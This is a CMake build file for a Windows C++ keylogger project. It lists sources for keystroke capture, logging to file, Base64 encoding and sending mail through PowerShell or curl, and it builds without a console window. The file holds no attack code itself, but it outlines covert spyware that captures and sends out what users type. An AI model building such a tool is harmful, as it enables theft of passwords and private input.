
set(SOURCES
		DefaultFileSystemAccess.cpp
		KeyloggerDirectoryLocator.cpp
		Base64Encryptor.cpp
		TimestampFetcher.cpp
		PowerShellSendMailScriptCreator.cpp
		PowerShellMailSender.cpp
		CurlMailSender.cpp
		UserInputFileLogger.cpp
		KeyboardInput.cpp
		KeyboardProcessor.cpp
		Keylogger.cpp
		KeyloggerFactory.cpp
		)

add_executable(keylogger ${SOURCES} "Main.cpp")

target_compile_options(keylogger PRIVATE /std:c++17 /permissive- /W3)
target_include_directories(keylogger PRIVATE
        ${CURL_INCLUDE_DIR}
		)
target_link_libraries(keylogger PRIVATE libcurl)
target_link_options(keylogger PRIVATE "/SUBSYSTEM:WINDOWS" "/ENTRY:mainCRTStartup")

